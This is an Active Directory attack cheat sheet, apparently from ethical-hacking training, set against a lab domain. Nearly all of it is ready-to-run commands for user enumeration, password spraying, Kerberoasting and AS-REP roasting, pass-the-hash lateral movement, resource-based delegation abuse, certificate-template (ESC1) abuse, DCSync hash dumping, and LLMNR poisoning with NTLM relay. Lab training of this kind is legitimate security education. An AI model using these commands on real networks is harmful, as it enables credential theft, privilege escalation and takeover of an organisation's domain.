# Active Directory Attacks

Quick reference for the AD attack chain (Impacket / NetExec / BloodHound / Certipy). Pairs with [Module 06](../modules/06-system-hacking/), the [identity attack paths](../defender-pam/identity-attack-paths.md), and the [capstone](../labs/capstone.md). **Lab / authorized only.** Vars: `DC=192.168.56.30`, `DOMAIN=ceh.lab`, foothold `jdoe:'Passw0rd!'`.

> On Kali the Impacket tools are prefixed `impacket-*`. Kerberos is clock-sensitive — if you see `KRB_AP_ERR_SKEW`, sync time: `sudo ntpdate $DC` (or `rdate`), and point DNS at the DC.

## Enumerate
```bash
nxc smb $DC -u jdoe -p 'Passw0rd!' --users --groups --shares --pass-pol
nxc smb 192.168.56.0/24 -u jdoe -p 'Passw0rd!'          # spray/validate across a subnet
ldapsearch -x -H ldap://$DC -b "dc=ceh,dc=lab" "(objectClass=user)" sAMAccountName
bloodhound-python -u jdoe -p 'Passw0rd!' -d $DOMAIN -ns $DC -c all   # -> import .json into BloodHound
kerbrute userenum -d $DOMAIN --dc $DC users.txt         # valid users
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Spring2025!'
```

## Kerberos credential attacks
```bash
# Kerberoasting — crack service-account passwords (SPN accounts)
impacket-GetUserSPNs $DOMAIN/jdoe:'Passw0rd!' -dc-ip $DC -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# AS-REP roasting — accounts with pre-auth disabled
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
Hashcat modes: **13100** TGS-REP (Kerberoast) · **18200** AS-REP · **1000** NTLM · **5600** NetNTLMv2.

## Move laterally (with a password or a hash)
```bash
impacket-psexec  $DOMAIN/administrator@$TARGET               # asks password
impacket-psexec  $DOMAIN/administrator@$TARGET -hashes :<NThash>   # Pass-the-Hash
impacket-wmiexec $DOMAIN/administrator@$TARGET -hashes :<NThash>   # quieter than psexec
evil-winrm -i $TARGET -u administrator -H <NThash>          # WinRM shell via PtH
nxc smb $TARGET -u administrator -H <NThash> -x whoami       # run a command via PtH
```

## Delegation abuse (RBCD)
```bash
# jdoe has GenericWrite on ws01 -> impersonate to it
impacket-addcomputer $DOMAIN/jdoe:'Passw0rd!' -computer-name 'FAKE$' -computer-pass 'Fake123!' -dc-ip $DC
impacket-rbcd $DOMAIN/jdoe:'Passw0rd!' -delegate-to 'ws01$' -delegate-from 'FAKE$' -action write -dc-ip $DC
impacket-getST $DOMAIN/'FAKE$':'Fake123!' -spn cifs/ws01.ceh.lab -impersonate Administrator -dc-ip $DC
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass ws01.ceh.lab
```

## ADCS abuse (Certipy — ESC1–8)
```bash
certipy find -u jdoe@$DOMAIN -p 'Passw0rd!' -dc-ip $DC -vulnerable -stdout   # audit templates
certipy req -u jdoe@$DOMAIN -p 'Passw0rd!' -ca <CA-name> -template ESC1-Vuln -upn administrator@$DOMAIN -dc-ip $DC
certipy auth -pfx administrator.pfx -dc-ip $DC              # -> TGT + NT hash as Administrator
```

## Dump hashes / DCSync (needs privilege)
```bash
impacket-secretsdump $DOMAIN/administrator@$DC              # SAM + LSA + NTDS (DCSync)
impacket-secretsdump $DOMAIN/administrator@$DC -just-dc-user krbtgt   # just the krbtgt hash
```
After a DA/krbtgt compromise, rotate **krbtgt twice**.

## Responder + NTLM relay
```bash
sudo responder -I eth0 -wv                                  # poison LLMNR/NBT-NS -> NetNTLMv2
impacket-ntlmrelayx -t ldaps://$DC -smb2support             # relay captured auth
```

> Deep reference: The Hacker Recipes — https://www.thehacker.recipes/ad/ · Impacket — https://github.com/fortra/impacket · Certipy — https://github.com/ly4k/Certipy · NetExec — https://www.netexec.wiki/
